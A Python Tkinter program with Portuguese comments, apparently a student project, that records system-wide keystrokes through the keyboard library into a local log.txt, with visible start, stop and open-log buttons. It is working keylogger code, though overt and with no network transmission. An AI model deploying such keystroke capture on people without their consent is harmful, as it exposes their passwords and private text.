import keyboard # Importando a biblioteca keyboard, usada para capturar eventos do teclado
import os       # Importando a biblioteca os, usada especificamente neste caso para manipulação do arquivo onde estarão salvas as teclas digitadas
import tkinter as tk # Importando a biblioteca tkinter, um framework de frontend imbutido no Python
import tkinter.messagebox as mbox
import threading


def registrar_tecla(tecla): # Função responsável por registrar a telca capturada no arquivo 'log.txt'
    with open('log.txt', 'a', encoding='utf-8') as arquivo_log: # Abre (ou cria, caso não exista) o arquivo 'log.txt' no modo adição
        
        if tecla.name == 'enter': # Se a tecla for 'enter', faz uma quebra de linha
            arquivo_log.write(os.linesep) # Utilização do os.linesep para que garantir compatibilidade entre SOs na quebra de linha

        elif tecla.name == 'backspace': # Se a tecla for 'backspace', remove o último caractere gravado
            arquivo_log.seek(0, os.SEEK_END) # Move o ponteiro para o final do arquivo
            posicao_ponteiro = arquivo_log.tell() # Ontém a posição atual do ponteiro
            
            if posicao_ponteiro > 0:
                arquivo_log.truncate(posicao_ponteiro - 1) # Remove o último caractere digitado

        elif tecla.name == 'space': # Se a tecla for 'space', adiciona um espaço em branco
            arquivo_log.write(" ")

        elif len(tecla.name) == 1: # Se o nome da tecla tiver apenas 1 caracter, grava a tecla normalmente (o caso de letras, números, símbolos, sinais de pontuação, acentos, etc.)
            arquivo_log.write(tecla.name)

registrando = False

def iniciar_registro():
    global registrando
    if registrando:
        mbox.showinfo('Aviso', 'O registro já está iniciado.')
    else:
        registrando = True
        threading.Thread(target=loop_registro, daemon=True).start()
        mbox.showinfo('Registro', 'Captura iniciada.')

def parar_registro():
    global registrando
    if not registrando:
        mbox.showinfo('Aviso', 'Nenhum registro foi iniciado.')
    else:
        registrando = False
        mbox.showinfo('Registro', 'Captura finalizada.')

def loop_registro():
    global registrando
    while registrando:
        tecla = keyboard.read_event(suppress=False) # Criando um objeto 'tecla' que vai ser utilizado para conter os names das teclas (atributo referente ao nome de uma tecla)
        
        if not registrando:
            break

        if tecla.event_type == keyboard.KEY_DOWN: # Captura as teclas apenas quando digitadas
            registrar_tecla(tecla) # Execução da função de registrar as teclas, utilizando os atributos salvos no objeto 'tecla' para decidir como cada tecla deve ser salva no arquivo 'log.txt'

def gerar_arquivo_logs():
    caminho = os.path.abspath('log.txt')
    if not os.path.exists(caminho):
        mbox.showinfo('Nenhum log foi gerado ainda.')
    else:
        os.startfile(caminho)

root = tk.Tk() # Criação da janela
root.title('python keylogger')
root.geometry('360x420')
root.iconbitmap('icone.ico')

titulo = tk.Label(root, text='Pyhton Keylogger', font=('Arial', 24, 'bold'), fg='#1E00FF')
titulo.pack()

subtitulo = tk.Label(root, text='by felipe checcucci', font=('Arial', 10), fg='black')
subtitulo.pack(pady=(0, 30))

def criar_botao(texto, cor_bg, cor_bg_ativada, cor_texto_ativado, comando=None):
    return tk.Button(root, text=texto, font=('Arial', 10, 'bold'), bg=cor_bg, fg='black', relief='flat', activebackground=cor_bg_ativada, activeforeground=cor_texto_ativado, width=20, height=2, cursor='hand2', highlightthickness=0, command=comando)

botao_comecar_registro = criar_botao('Começar a registrar', '#D3D3D3', 'black','white', iniciar_registro)
botao_parar_registro = criar_botao('Parar registro', '#efa5a5', '#4e0c0c', 'white', parar_registro)
botao_gerar_arquivo = criar_botao('Gerar arquivo com logs', '#4e448f', '#1800ad', 'white', gerar_arquivo_logs)

botao_comecar_registro.pack(pady=10)
botao_parar_registro.pack(pady=10)
botao_gerar_arquivo.pack(pady=10)

root.mainloop() # Deixa a janela em loop (ou seja, ela não fecha)